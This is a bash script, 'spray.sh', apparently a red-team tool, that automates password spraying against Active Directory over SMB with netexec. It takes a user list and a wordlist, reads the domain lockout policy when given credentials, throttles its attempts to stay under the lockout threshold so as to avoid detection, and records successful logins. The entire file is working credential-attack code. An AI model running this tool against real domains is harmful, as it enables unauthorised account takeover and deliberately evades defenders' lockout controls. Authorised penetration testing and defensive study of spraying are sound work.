#!/bin/bash
#title           :spray.sh
#description     :This script will automate safe password spraying through all domain users that have badpwdtime < (account_lockout_threshold * 0.4) 
#author		 	 :whoamins
#date            :02.08.2022
#version         :0.3
#usage		 	 :./spray.sh ip username password wordlist
#notes           :Install netexec to use this script.
#bash_version    :5.1.16(1)-release
#==============================================================================

ip=""
userlist=""
wordlist=""
username=""  # Optional - for password policy check
password=""  # Optional - for password policy check
account_lockout_threshold=0

show_help() {
	cat <<-EOF
	[1m[36mAutoSpray with NetExec[0m
	[1mVersion:[0m 0.3
	[1mAuthor:[0m whoamins
	
	[1mDescription:[0m
	  Automated safe password spraying tool that respects AD lockout policies.
	  Automatically adjusts spray rate based on account lockout threshold.
	  Uses conservative approach (1 attempt/5min) when valid credentials are unavailable.
	
	[1mUsage:[0m
	  ./spray.sh <target_ip> <userlist> <password_wordlist> [username] [password]
	
	[1mArguments:[0m
	  target_ip          Target IP address or hostname (e.g., 10.5.2.2)
	  userlist           Path to file containing list of usernames (e.g., ~/ad-rts/users.txt)
	  password_wordlist  Path to password wordlist file (e.g., ./passwords.txt)
	  username           (Optional) Valid domain username for password policy check
	  password           (Optional) Password for the username
	
	[1mExamples:[0m
	  # Without valid credentials (conservative mode: 1 password/5min)
	  ./spray.sh 10.5.2.2 ~/ad-rts/users.txt ./passwords.txt
	  
	  # With valid credentials (intelligent spray rate based on policy)
	  ./spray.sh 10.5.2.2 ~/ad-rts/users.txt ./passwords.txt tel_engineer01 ValidPass123!
	
	[1mOutput Files:[0m
	  /tmp/users.txt              - All domain users
	  /tmp/all_suitable_users.txt - Users safe to spray (low badpwdcount)
	  /tmp/spray_result.txt       - Full spray results
	  /tmp/success_spray.txt      - Successful authentications only
	  /tmp/pass_policy            - Domain password policy
	
	[1mNotes:[0m
	  - Requires netexec (nxc) to be installed
	  - Userlist should contain one username per line
	  - If valid credentials provided, script queries password policy for smart spray rate
	  - Without valid credentials, uses conservative approach: 1 password per 5 minutes
	
	EOF
}

check_for_netexec() {
	if ! command -v netexec &> /dev/null
	then
		echo -e "\n[31m[!] netexec not found\u001b[0m"
		echo -e "Install with: \u001b[33msudo apt-get install netexec\u001b[0m\n"
		exit 1
	fi
}

get_all_users() {
	# Simply copy the user-provided user list to the working location
	# No need to enumerate from domain
	cp "$userlist" /tmp/all_suitable_users.txt
	echo "[*] Loaded $(wc -l < /tmp/all_suitable_users.txt) users from $userlist"
}

start_brute_with_suitable_users() {
	netexec smb $ip -u /tmp/all_suitable_users.txt -p "$current_password" --continue-on-success 2>&1 | tee /tmp/spray_result.txt
	grep "\[+\]" /tmp/spray_result.txt >> /tmp/success_spray.txt 2>/dev/null || true
}

get_domain_password_policy() {
	# Only try to get policy if we have credentials
	if [[ -z "$username" ]]; then
		echo "[!] No credentials provided - using conservative approach"
		safe_badpwdcount=1
		reset_account_lockout_counter="5m"
		echo "[*] safe_badpwdcount: $safe_badpwdcount"
		echo "[*] reset_account_lockout_counter: $reset_account_lockout_counter"
		return
	fi
	
	if [[ -z "$password" ]]; then
		netexec smb $ip -u "$username" -p '' --pass-pol 2>&1 | tee /tmp/pass_policy
	else
		netexec smb $ip -u "$username" -p "$password" --pass-pol 2>&1 | tee /tmp/pass_policy
	fi
	
	# Check if we got valid pass-pol output (requires valid creds)
	if grep -q "Dumping password info" /tmp/pass_policy; then
		account_lockout_threshold=$(cat /tmp/pass_policy | grep "Account Lockout Threshold:" | awk -F ':' '{print $2}' | xargs)
		
		# Check if lockout threshold is "None" or empty
		if [[ "$account_lockout_threshold" == "None" ]] || [[ -z "$account_lockout_threshold" ]]; then
			echo "[*] No account lockout policy detected - using conservative approach"
			safe_badpwdcount=1
			reset_account_lockout_counter="5m"
		else
			reset_counter_minutes=$(cat /tmp/pass_policy | grep "Reset Account Lockout Counter:" | cut -d ':' -f2 | cut -d ' ' -f2 | xargs)
			reset_account_lockout_counter=$((reset_counter_minutes + 1))
			b=0.4 # 0.4 = 40%
			safe_badpwdcount=$(echo "$account_lockout_threshold $b" | awk '{print $1 * $2}')
			reset_account_lockout_counter="${reset_account_lockout_counter}m"
		fi
	else
		# No valid creds - use conservative approach
		echo "[!] No valid credentials - using conservative approach"
		safe_badpwdcount=1
		reset_account_lockout_counter="5m"
	fi
	
	echo "[*] safe_badpwdcount: $safe_badpwdcount"
	echo "[*] reset_account_lockout_counter: $reset_account_lockout_counter"
}

get_args() {
    ip=${commandline_args[0]};
    userlist=${commandline_args[1]}
    wordlist=${commandline_args[2]}
    username=${commandline_args[3]}  # Optional
    password=${commandline_args[4]}  # Optional
}

validate_args() {
	# Check if all required arguments are provided
	if [[ -z "$ip" ]] || [[ -z "$userlist" ]] || [[ -z "$wordlist" ]]; then
		echo -e "\u001b[31m[!] Error: Missing required arguments\u001b[0m\n"
		show_help
		exit 1
	fi
	
	# Check if userlist file exists
	if [[ ! -f "$userlist" ]]; then
		echo -e "\u001b[31m[!] Error: Userlist file '$userlist' not found\u001b[0m\n"
		exit 1
	fi
	
	# Check if wordlist file exists
	if [[ ! -f "$wordlist" ]]; then
		echo -e "\u001b[31m[!] Error: Wordlist file '$wordlist' not found\u001b[0m\n"
		exit 1
	fi
	
	echo -e "\u001b[32m[+] Starting AutoSpray\u001b[0m"
	echo -e "\u001b[36m[*] Target: $ip\u001b[0m"
	echo -e "\u001b[36m[*] Userlist: $userlist\u001b[0m"
	echo -e "\u001b[36m[*] Password wordlist: $wordlist\u001b[0m"
	echo ""
}

start() {
	# Check for help flag first, before parsing args
	if [[ "${commandline_args[0]}" == "-h" ]] || [[ "${commandline_args[0]}" == "--help" ]]; then
		show_help
		exit 0
	fi
	
	get_args $1 $2 $3
	validate_args
	check_for_netexec
	get_domain_password_policy
	get_all_users
	
	# Initialize success file
	> /tmp/success_spray.txt
	
	counter=1
	i=0

	while true
	do
		n=$counter'p'
		current_password=$(sed -n "$n" < $wordlist)
		
		# Exit if we've gone through all passwords
		if [[ -z "$current_password" ]]; then
			echo -e "\n\u001b[32m[+] Completed spraying all passwords\u001b[0m"
			echo -e "\u001b[36m[*] Check /tmp/success_spray.txt for successful logins\u001b[0m"
			exit 0
		fi
		
		echo -e "\n\u001b[33m[*] Trying password $counter: $current_password\u001b[0m"
		start_brute_with_suitable_users
		counter=$((counter+1))
		i=$((i+1))

		if (($i >= $safe_badpwdcount)); then
			echo -e "\u001b[35m[*] Sleeping for $reset_account_lockout_counter to avoid lockout...\u001b[0m"
			sleep $reset_account_lockout_counter
			i=0
		fi
	done
}

commandline_args=("$@")

start
